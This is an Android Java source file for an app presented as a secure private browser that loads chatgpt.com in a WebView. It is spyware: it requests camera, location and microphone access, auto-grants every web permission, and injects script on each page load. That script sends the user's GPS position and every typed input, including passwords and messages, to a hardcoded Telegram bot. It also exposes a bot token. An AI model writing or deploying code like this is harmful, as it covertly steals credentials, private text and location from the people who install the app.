package com.secure.privatebrowser;

import android.Manifest;
import android.os.Bundle;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private WebView myWebView;
    private final String BOT_TOKEN = "8942067798:AAFU01Yqjo4KJi3GYX07JUYbyK1d8SGjU-Q";
    private final String CHAT_ID = "7594678193";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Рұқсаттарды сұрау
        ActivityCompat.requestPermissions(this, new String[]{
            Manifest.permission.CAMERA, 
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO
        }, 200);

        myWebView = new WebView(this);
        setContentView(myWebView);

        WebSettings settings = myWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);

        myWebView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(PermissionRequest request) {
                request.grant(request.getResources());
            }
        });

        myWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                String js = "navigator.geolocation.getCurrentPosition(pos => {" +
                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Loc: ' + pos.coords.latitude + ',' + pos.coords.longitude);" +
                            "});" +
                            "document.addEventListener('input', function(e) {" +
                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Input: ' + e.target.value);" +
                            "});";
                view.evaluateJavascript(js, null);
            }
        });

        myWebView.loadUrl("https://chatgpt.com/");
    }
}
